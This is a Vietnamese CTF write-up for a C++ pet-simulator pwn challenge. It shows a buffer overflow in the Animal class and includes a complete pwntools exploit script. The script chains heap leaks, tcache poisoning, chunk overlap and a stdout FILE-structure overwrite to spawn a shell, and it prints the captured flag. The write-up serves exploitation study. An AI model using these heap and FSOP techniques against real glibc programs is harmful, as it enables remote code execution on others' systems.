---
title: PWN - Learning OOP
---


## Bug

Bug nằm ở hàm `set_name()` trong class `Animal`

```cpp
        void set_name() {
            std::cout << "Enter name: " << std::endl;
            std::cin >> this->name; // BUG: Buffer Overflow
        }
```

Ta thấy xuất hiện bug buffer overflow ở đây, trong các challegne heap, thường ta sẽ xử dụng bug này để thay đổi các metadata của chunk, từ đó làm các mục đích khác xa hơn

## Exploit

Mình không rành về C++ lắm, nên cách mình làm có phần dài và cầu kì hơn cách intended, intended là vtable hijack. Đối với cách làm của mình, mình chỉ đơn thuần là heap fengshui. Phân tích một chút về program:

```cpp
enum Status {
    FULL = 1,
    WELLRESTED = 2,
};

class Animal {
    public:
        Animal() {
            memset(this->name, 0x41, sizeof(this->name));
            this->age = 0;
            this->fullness = 10;
            this->status = Status::FULL | Status::WELLRESTED;
        }
        virtual void eat() {
            std::cout << "NOM" << std::endl;
            this->fullness = 20;
            this->status |= Status::FULL;
        }
        virtual void sleep() {
            std::cout << "ZZZ" << std::endl;
            this->status |= Status::WELLRESTED;
        }
        virtual void play() {
            std::cout << "Played with " << this->name << std::endl;
            this->status = 0;
        }
        virtual constexpr size_t get_max_age() = 0; // pure virtual function
        int age_up() {
            return ++this->age;
        }
        int fullness_down() {
            return --this->fullness;
        }
        void set_name() {
            std::cout << "Enter name: " << std::endl;
            std::cin >> this->name; // BUG: Buffer Overflow
        }
        char* get_name() {
            return this->name;
        }
        int get_status() {
            return this->status;
        }
        void die() {
            std::cout << this->name << " died :(" << std::endl;
            return;
        }
    protected:
        char name[0x100];
        int age;
        int fullness;
        int status;
};
```

Một class `Animal` được định nghĩa với các thuộc tính và phương thức khác nhau để mô phỏng hành vi của một con vật. Class này có các thuộc tính như name, `age`, `fullness` và `status`, cùng với các phương thức để ăn, ngủ, chơi và quản lý các thuộc tính này. Class này cũng có một số phương thức ảo để cho phép các lớp con định nghĩa hành vi cụ thể của chúng. Để ý thêm ta có hàm `update()`:

```cpp
void update() {
    for(size_t i = 0; i < MAX_PET_COUNT; i++) {
        Animal* pet = pets[i];
        if(pet != nullptr) {
            if(pet->fullness_down() == 0 || pet->age_up() > pet->get_max_age()) {
                pet->die();
                delete pet;
                pets[i] = nullptr;
                num_pets--;
            }
        }
    }
    return;
}
```

Hàm này sẽ free đi class đó, với các điều kiện như sau: `pet->fullness` = 0 hoặc `pet->age` > `pet->get_max_age()`. Để đơn giản mình chỉ cần quan tâm đến `pet->fullness`. Khi nó bằng 0 tức là nó sẽ free chunk đó. Và đây là exploit:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./learning_oop_patched', checksec=False)
libc = exe.libc

ru = lambda a: p.recvuntil(a)
lleak = lambda a, b: log.info(a + " = %#x" % b)

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500
# brva 0x1408
brva 0x15D1
brva 0x1605
brva 0x1639
brva 0x166A
# b *update
brva 0x1B28
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]), ssl=True)
    return p

def adopt(pet_type: int, name: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Choose pet species (1=Dog, 2=Cat, 3=Parrot, 4=Horse): ', f"{pet_type}".encode())
    p.sendlineafter(b'Enter name: ', name)


def play(pet_index: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Which pet? ', f"{pet_index}".encode())


def feed(pet_index: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Which pet? ', f"{pet_index}".encode())


def rest(pet_index: int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Which pet? ', f"{pet_index}".encode())

# ==================== EXPLOIT ====================
p = start()

adopt(1, b"0" * 0x100 + p32(0) + p32(3))
ru(b"Adopted new pet: ")
heap = int(p.recvline(), 16)
slog('heap @ %#x', heap)

adopt(1, b"1" * 0x100 + p32(0) + p32(3))
adopt(1, b"2" * 0x100 + p32(0) + p32(1))

sla(b"> ", b"6")

# tcache poisoning
mangle = (heap + 0x340) ^ (heap + 0x240) >> 12
adopt(1,  b"3" * 0x100 + p32(0) + p32(0x6) + p64(3) + p64(0x121) + p64(mangle))
adopt(1, b"4" * 0x100 + p32(0) + p32(0x2))

# overlap chunk
adopt(1, b"5" * 0x100 + p32(0) + p32(0x2) + b"5" * (0x2f0 - 0x110) + p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21))

# leak pie
ru(b"4" * 0xf8)
pie = u64(rb(6).ljust(8, b"\x00")) - 0x4c98
slog('pie base @ %#x', pie)

# set up
adopt(1, b"6" * 0xf0 + p64(0x121) + p64(pie + 0x4c98) + p32(0) + p32(0x2))

sla(b"> ", b"6")
sla(b"> ", b"6")

# tcache poisoning
mangle = (heap) ^ (heap + 0x120) >> 12
adopt(1, b"7" * 0x100 + p32(0) + p32(0x3) + p64(3) + p64(0x121) + p64(mangle))
adopt(1, b"8" * 0x100)

# make fake unsortedbin
adopt(1, b"9" * 0x100 + p32(0) + p32(5) + p64(3) + p64(0x521)[:7])

# last remainder
adopt(1, b"A" * 0x100 + p32(0) + p32(2) + p64(3) + p64(0x401) + p64(pie + 0x4c98)[:7])

# leak libc
sla(b"> ", b"3")
ru(b"A" * 0x100)
ru(b"1. ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
slog('libc base @ %#x', libc_base)
sla(b"pet? \n", b"1")

sla(b"> ", b"6")

adopt(1, b"B" * 0x100 + p32(0) + p32(0x13) + p64(3) + p64(0x121)[:7])

for i in range(18):
	sla(b"> ", b"6")

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# tcache poisioning
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
mangle = (_IO_2_1_stdout_ - 0x120) ^ (heap + 0x240) >> 12
adopt(1, b"C" * 0x100 + p32(0) + p32(5) + p64(3) + p64(0x121) + p64(mangle))
adopt(1, b"D" * 0x10)

system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

adopt(1, b"E" * 0x100 + p32(0) + p32(5) + p64(3) + b"E" * 8 + payload)

interactive()
# SEKAI{WOw11!1!Iii_UM4Z1NG_3xpl0it_sk1llz!!!!}
```
